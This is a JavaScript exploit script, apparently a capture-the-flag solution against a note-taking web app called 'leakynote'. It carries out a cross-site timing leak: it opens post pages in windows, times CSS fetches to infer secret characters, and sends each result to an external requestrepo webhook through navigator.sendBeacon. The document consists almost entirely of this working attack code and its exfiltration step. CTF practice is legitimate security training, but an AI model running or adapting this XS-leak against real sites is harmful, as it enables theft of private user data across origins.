
/*
get post id
create post request id
open 10 req
fetch css file
calculate time for each character => get the lowest time

get average time for each character => more precise
send time to webhooks
*/

const BASE_URL = "https://leakynote.be.ax"
const WEBHOOK_URL = "https://bhigczrs.requestrepo.com"

const SOURCE_URL = [
  `${BASE_URL}/assets/normalize.css`, 
  `${BASE_URL}/assets/milligram.css`
]


const MAX_OPEN_REQ = 10;
const MAX_TRIES = 3;


const list_id = ['94b64c59407b8410', 'a9bf70ba88c96bc4', '203c5cf82897d8b8', 'c78b932bd5167d84', '3541781fde5e3d8d', 'f8d6c4b428601d10', '8773937b9dc06c29', '40e4f81969014d16', 'cd4f917d97e756a7', '9120329ebc997a45', 'b5a41d3084f2d9c6', '93206ad21fa30975', 'b58f6020438c1010']

const list_character = "ldeakynotrge}"

// sleep time
// wait for document to load
const sleep = (ms) =>  new Promise((r) => setTimeout(r,ms));
const wait = (url) => new Promise(async (resolve) => {
	while(true) {
		try{
			url.document;
		} catch {
			resolve();
			break;
		}
		await sleep(20);
	}
})

// add header: not have always
// 404 : csp is not enabled
// 200 : csp is enabled 

// send request to server
// if 404 => load iframe, css file
// if 200 => not load
// use this to xsleak with time 

const measureOne = async (url) => {
  const firstReq = open(url);
  wait(firstReq);

  const reqs = [];

  for (let i = 0; i < MAX_OPEN_REQ; i++) {
    reqs.push(open(url));
  }

  Promise.all(reqs.map((req) => wait(req)));
  let start = performance.now();

  await Promise.all(
    SOURCE_URL.map((u) => fetch(u, {mode: "no-cors"}))
  )

  const end = performance.now();
  for (const w of reqs) {
    w.close();
  }
  firstReq.close();
  return end - start;
}

const measure = async (url) => {
  let avg = 0;
  for (let i =0; i < MAX_TRIES; i++) {
    const t = await measureOne(url);
    avg += t;
  }
  avg /= MAX_TRIES;
  return avg;
}

const leakOne = async (id) => {
  const url = `${BASE_URL}/post.php?id=${id}`;
  return measure(url);
}

const leak = async () => {
  min_Time = 10000000000;
  min_chr = '';
  for (let i = 0; i < list_id.length; i++) {
    const leak_time = await leakOne(list_id[i]);
    if (leak_time < min_Time) {
      min_Time = leak_time;
      min_chr = list_character[i];
    }
    console.log("leak_time: ", leak_time);
    navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
      "stt": i,
      "test_char": list_character[i],
      "time_to_test": leak_time,
      "min_char": min_chr,
      "min_time": min_Time
    }))

    await sleep(1000);
  }
}

const main = async () => {
  console.log("start");
  leak();
}
main();


